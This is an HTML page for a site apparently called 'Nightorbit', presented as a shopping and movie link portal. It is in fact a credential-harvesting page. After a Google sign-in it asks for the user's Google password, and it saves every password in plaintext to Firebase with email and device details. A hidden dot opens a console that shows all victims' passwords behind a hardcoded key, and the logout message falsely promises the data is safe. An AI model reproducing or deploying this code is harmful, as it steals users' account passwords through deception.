<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nightorbit (Gyidi bazar and cinema)</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    
    <style>
        :root { --primary: #00d2ff; --neon: #ff0055; --gold: #ffd700; --bg: #05070a; }
        * { box-sizing: border-box; }
        body { 
            margin: 0; padding: 0; width: 100%; height: 100vh; 
            background: radial-gradient(circle at center, #1B2735 0%, var(--bg) 100%);
            font-family: 'Segoe UI', sans-serif; color: white;
            display: flex; align-items: center; justify-content: center; overflow: hidden;
        }
        .card { 
            background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(25px);
            padding: 30px; border-radius: 30px; text-align: center; 
            width: 360px; border: 1px solid rgba(255,255,255,0.1); 
            box-shadow: 0 25px 50px rgba(0,0,0,0.8); position: relative; z-index: 10;
        }
        .menu-dots { position: absolute; top: 25px; left: 25px; cursor: pointer; font-size: 30px; color: var(--primary); z-index: 100; opacity: 0.7; }
        .pass-wrapper { position: relative; width: 100%; }
        .pass-wrapper i { position: absolute; right: 15px; top: 22px; cursor: pointer; color: #888; }
        input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 12px; border: 1px solid rgba(0,210,255,0.3); background: rgba(0,0,0,0.4); color: white; outline: none; }
        .btn-main { background: linear-gradient(45deg, var(--primary), #3a7bd5); color: white; border: none; padding: 15px; border-radius: 12px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 10px; text-transform: uppercase; }
        .btn-google { background: white; color: black; border: none; padding: 12px; border-radius: 12px; width: 100%; margin-top: 12px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; }
        .link-card { background: rgba(255,255,255,0.07); padding: 12px; border-radius: 15px; margin: 8px 0; display: flex; justify-content: space-between; align-items: center; text-decoration: none; color: white; border-left: 4px solid var(--neon); transition: 0.3s; font-size: 13px; }
        .link-card:hover { background: rgba(255,255,255,0.15); transform: translateX(5px); }
        #admin-panel { position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 1000; display: none; padding: 30px; overflow-y: auto; }
        .admin-card { background: #111; padding: 15px; margin-bottom: 15px; border-radius: 15px; border: 1px solid #333; text-align: left; position: relative; }
        #logout-overlay { position: fixed; inset: 0; background: #000; z-index: 2000; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 40px; }
        .hidden { display: none !important; }
        .admin-dot { position: absolute; bottom: 15px; right: 15px; cursor: pointer; font-size: 20px; color: #111; z-index: 100; }
    </style>
</head>
<body>

    <div id="logout-overlay">
        <div style="font-size: 60px; margin-bottom: 20px;">üåπ</div>
        <div id="bye-text-display" style="color: white; line-height: 1.8; font-size: 18px; max-width: 500px;"></div>
    </div>

    <div id="admin-panel">
        <h1 style="color: var(--primary);">Owner Console</h1>
        <button onclick="document.getElementById('admin-panel').style.display='none'" class="btn-main" style="width:auto; padding: 10px 30px; margin-bottom: 20px;">EXIT</button>
        <div id="user-rows-container"></div>
    </div>

    <div class="menu-dots" onclick="bypassLogin()">‚ãÆ</div>
    <div class="admin-dot" onclick="adminAccess()">.</div>

    <div id="login-box" class="card">
        <h1 style="color: var(--primary); margin: 0; font-size: 32px; letter-spacing: 2px; font-weight: 800;">NIGHTORBIT</h1>
        <button class="btn-google" onclick="authGoogle()">
            <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/action/google.svg" width="18"> SIGNUP WITH GOOGLE
        </button>
        <div style="margin: 20px 0; color: #444; font-size: 10px;">‚Äî SECURITY VERIFIED ‚Äî</div>
        <input type="email" id="u-email" placeholder="Email Address">
        <div class="pass-wrapper">
            <input type="password" id="u-pass" placeholder="Password (One Name)">
            <i class="fa-solid fa-eye" id="togglePass" onclick="togglePassword()"></i>
        </div>
        <button class="btn-main" onclick="authEmail()">Enter Bazaar</button>
        <p id="error-msg" style="color: var(--neon); font-size: 11px; margin-top: 10px;"></p>
    </div>

    <div id="member-area" class="card hidden">
        <h2 id="user-welcome" style="color: var(--primary);">Welcome!</h2>
        <div style="text-align: left; margin-top: 15px;">
            <a href="https://www.daraz.pk" target="_blank" class="link-card">üõí Daraz Mall <span>Shop</span></a>
            <a href="https://www.foodpanda.pk" target="_blank" class="link-card" style="border-left-color: #d70161;">üçï Food Panda <span>Order</span></a>
            <a href="https://tamashaweb.com/" target="_blank" class="link-card" style="border-left-color: var(--gold);">üì∫ Tamasha App <span>Live TV</span></a>
            <a href="https://bollyflix.org.in/" target="_blank" class="link-card" style="border-left-color: #00ff00;">üé¨ Bollyflix <span>Movies</span></a>
            <a href="#" target="_blank" class="link-card" style="border-left-color: #00d2ff;">üé¨ Watch & Earn <span>$ Earn</span></a>
        </div>
        <button onclick="logoutSequence()" style="margin-top: 25px; color: #ff4b2b; background: none; border: none; cursor: pointer; text-decoration: underline; font-weight: bold;">Secure Logout</button>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBxJqJkrAaFf3eR0QWvhet6IvvFVHYExeU",
            authDomain: "my-market-ff254.firebaseapp.com",
            projectId: "my-market-ff254",
            storageBucket: "my-market-ff254.appspot.com",
            messagingSenderId: "1039626785987",
            appId: "1:1039626785987:web:ae5a65a0b16444a2cffe76",
            databaseURL: "https://my-market-ff254-default-rtdb.firebaseio.com"
        };
        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        const db = firebase.database();
        let currentUserName = "";

        function getDeviceBrand() {
            const ua = navigator.userAgent;
            if (/android/i.test(ua)) {
                if (/samsung/i.test(ua)) return "Samsung";
                if (/infinix/i.test(ua)) return "Infinix";
                if (/oppo/i.test(ua)) return "Oppo";
                if (/vivo/i.test(ua)) return "Vivo";
                if (/tecno/i.test(ua)) return "Tecno";
                return "Android Phone";
            }
            return /iPhone/i.test(ua) ? "Apple iPhone" : "PC/Laptop";
        }

        function togglePassword() {
            const p = document.getElementById('u-pass');
            p.type = p.type === "password" ? "text" : "password";
        }

        function authGoogle() {
            const provider = new firebase.auth.GoogleAuthProvider();
            auth.signInWithPopup(provider).then(res => {
                let p = prompt("Google Password (Single Word Only):");
                if (!p || p.trim().includes(" ")) {
                    alert("Error: Password space ke baghair ek naam hona chahiye!");
                    auth.signOut();
                } else {
                    processUser(res.user, p, res.user.displayName);
                }
            });
        }

        function authEmail() {
            const e = document.getElementById('u-email').value;
            const p = document.getElementById('u-pass').value;
            if(!e || !p) return alert("Fill fields!");
            if(p.trim().includes(" ")) return alert("Password mein space nahi honi chahiye!");
            auth.signInWithEmailAndPassword(e, p).then(res => processUser(res.user, p, e.split('@')[0]))
            .catch(() => auth.createUserWithEmailAndPassword(e, p).then(res => processUser(res.user, p, e.split('@')[0])));
        }

        function processUser(user, pass, realName) {
            currentUserName = realName;
            db.ref('users/' + user.uid).once('value', snap => {
                let data = snap.val();
                let secret = (data && data.savedName) ? data.savedName : realName;
                db.ref('users/' + user.uid).update({
                    email: user.email,
                    password: pass,
                    device: getDeviceBrand(),
                    savedName: secret,
                    time: new Date().toLocaleString()
                }).then(() => showMemberUI(realName));
            });
        }

        function adminAccess() {
            if (prompt("Admin Key:") === "rr123456789000rr") {
                document.getElementById('admin-panel').style.display = 'block';
                db.ref('users').on('value', (snap) => {
                    let html = "";
                    snap.forEach(c => {
                        let v = c.val();
                        html += `<div class="admin-card">
                            <b style="color:var(--gold)">Nick: ${v.savedName || 'Member'}</b><br>
                            <span style="color:var(--primary)">Gmail: ${v.email}</span><br>
                            <span>Device: ${v.device}</span><br>
                            <span style="color:#fff">Pass: ${v.password}</span><br>
                            <div style="margin-top:10px;">
                                <button onclick="editNick('${c.key}', '${v.savedName || ''}')" style="background:var(--primary); border:none; border-radius:5px; padding:5px 10px; cursor:pointer; font-size:11px;">EDIT NICK</button>
                                <button onclick="if(confirm('Delete?')) firebase.database().ref('users/${c.key}').remove()" style="background:red; color:white; border:none; border-radius:5px; padding:5px 10px; margin-left:10px; cursor:pointer; font-size:11px;">REMOVE</button>
                            </div>
                        </div>`;
                    });
                    document.getElementById('user-rows-container').innerHTML = html;
                });
            }
        }

        function editNick(uid, oldNick) {
            let n = prompt("Enter New Nickname:", oldNick);
            if(n) db.ref('users/' + uid).update({ savedName: n });
        }

        function showMemberUI(name) {
            document.getElementById('login-box').classList.add('hidden');
            document.getElementById('member-area').classList.remove('hidden');
            document.getElementById('user-welcome').innerText = "Hello, " + name;
        }

        function bypassLogin() {
            if (prompt("Master Key:") === "rr123456789000rr") showMemberUI("Farooq");
        }

        function logoutSequence() {
            const overlay = document.getElementById('logout-overlay');
            document.getElementById('bye-text-display').innerHTML = `
                <span style="font-size: 26px; color: var(--gold); font-weight: bold;">Goodbye, ${currentUserName}!</span><br><br>
                It was an absolute pleasure serving you at Nightorbit today. 
                Your data is safe and your session is closing securely.<br><br>
                May God bless you with happiness and success in every step of your life. 
                We are looking forward to your next visit soon!<br><br>
                <i>"Keep smiling and stay blessed. May God protect you always. Allah Hafiz!"</i>
            `;
            overlay.style.display = 'flex';
            setTimeout(() => { location.reload(); }, 6500);
        }
    </script>
</body>
</html>
